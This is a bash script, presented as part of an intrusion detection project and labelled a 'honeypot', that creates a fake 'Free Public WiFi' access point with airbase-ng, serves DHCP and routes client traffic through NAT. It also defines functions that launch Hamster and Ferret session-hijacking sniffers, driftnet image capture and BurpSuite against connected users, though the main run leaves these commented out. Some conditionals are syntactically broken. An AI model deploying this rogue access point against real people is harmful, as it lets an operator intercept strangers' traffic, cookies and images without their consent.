#!/bin/bash

#    This file is part of Intrusion Detection System By - Raghav Bisht.
#
#    Intrusion Detection System By - Raghav Bisht is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    Intrusion Detection System By - Raghav Bisht is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>

# Select a wireless interface to use for the AP
selectWirelessInterface () {
    iwconfig | grep 802 > /tmp/ethlist
    clear
    echo "-------------------------------------------------"
    echo "Available interfaces:"
    echo ""
    cat /tmp/ethlist
    echo ""
    echo "-------------------------------------------------"
    read -p "What interface will you choose for the fake AP? " -e wlan 
    rm /tmp/ethlist
}

# Start networking (if selected)
network () {
    read -p "Start networking [Y/N]? " -e answer
    if [ "$answer" = "Y" && "$answer" = "y"] ; then
        service networking start > /dev/null 2>&1
    elif ["$answer" = "N" && "$answer" = "n"] ; then
	exit 0
    fi
    selectWirelessInterface
    read -p "External USB WLAN present [Y/N]? " -e ext
    if [ "$ext" = "Y" ] ; then
       ifconfig $wlan up > /dev/null 2>&1
    fi
}

# Start a monitor on the first wlan adapter
monitor () {
    echo -n "Starting monitor device putting your device in monitor mode...           "
    ifconfig -a > /tmp/pre
    airmon-ng start $wlan 8 > /dev/null 2>&1 
    sleep 10 
    ifconfig -a > /tmp/post
    monintme=`diff /tmp/pre /tmp/post | grep mon | awk '{ print $2 }'`
    echo "DONE"
    # echo "Detected monitor interface: $monintme"
}

# Fire up the fake access point
createAP () {
    nameap="Free Public WiFi"
    read -p "Use default ESSID [Free Public WiFi][Y/N]? " -e defuse 
    if [ $defuse = "N" ] ; then
        read -p "What will the AP name be? " -e nameap
    fi
    read -p "Start Access Point [Y/N]? " -e prom 
    echo "AP name will be $nameap"
    echo -n "Starting fake AP...                  "
    if [ $prom = "Y" ] ; then
        airbase-ng -P -e $nameap $monintme > /tmp/ap_access_list &
    else
        airbase-ng -e $nameap $monintme > /tmp/ap_access_list &
    fi
    sleep 10 
    echo "DONE"
}

# Activate the external interface
ExternalAccess () {
    echo -n "Enabling external access point for you......          "
    ifconfig wlan0 up 192.168.121.1 netmask 255.255.255.0 mtu 1500 > /dev/null 2>&1 
    sleep 10 
    echo "DONE"
}

# Start the DHCP server (restart to kill any 
# current ones which may exist
dhcp () {
    echo -n "Please wait while starting DHCP server......              "
    service dhcp3-server restart > /dev/null 2>&1 
    sleep 10
    echo "DONE"
}

# Route things from the fake AP to the world
routing () {
    echo -n "Please wait network routing is on run......     "
    iptables -t nat -A POSTROUTING -o $wlan -s 192.168.121.0/24 -j MASQUERADE > /dev/null 2>&1
    sleep 5
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo "DONE"
}

# Fire up evil rodents
startRodents () {
    read -p "Start Hamster [Y/N]? " -e starthammy
    if [ $starthammy = "Y" ] ; then
        echo -n "Starting Hamster...                  "
        /pentest/sniffers/hamster/hamster &
        echo "DONE"
    fi
    read -p "Start Ferret [Y/N]? " -e startferry
    if [ $startferry = "Y" ] ; then
        echo -n "Starting Ferret...                   "
        /pentest/sniffers/hamster/ferret -i at0 &
        echo "DONE"
    fi
    read -p "Do you want to launch the Hamster web interface [Y/N]? " -e hamweb
    if [ $hamweb = "Y" ] ; then
        /usr/bin/firefox 127.0.0.1:1234
    fi
}

# Capture all image traffic across the network
captureImages () {
    read -p "Start driftnet [Y/N]? " -e startdrift
    if [ $startdrift = "Y" ] ; then
        read -p "Capture images [Y/N]? " -e answer
        echo -n "Starting driftnet...                 "
        if [ $answer = "Y" ] ; then
            driftnet -i at0 -a -d /tmp/driftimages
            echo "DONE"
            echo "Image files are stored in /tmp/driftimages"
        else
            driftnet -i at0
            echo "DONE"
        fi
    fi
}

# Start BurpSuite to perform detailed packet analysis
startBurp () {
    read -p "Start BurpSuite [Y/N]? " -e burpstart
    if [ $burpstart = "Y" ] ; then
        echo -n "Starting BurpSuite...               "
            /root/burpme.sh > /dev/null 2>&1
        echo "DONE"
    fi
}
# Main Execution			
clear
echo "-----------------------------------------------------------------------------"
echo " >>-------------Starting The Fake Access Point Honeypot-------------------<< "
echo "-----------------------------------------------------------------------------"

network

echo "Get external internet access now, then"
read -p "press Enter to continue." -e throwaway

echo

monitor 
createAP
ExternalAccess
dhcp
routing
#captureImages
#startRodents
#startBurp

echo "---------------------------------------------"
echo ">>--------HONEYPOT IS RUNNING--------------<<"
echo "---------------------------------------------"
echo
echo "To watch the access point activity, try:"
echo "check command -> ifconfig, iwconfig"
echo 
echo "Program Started...!!!"
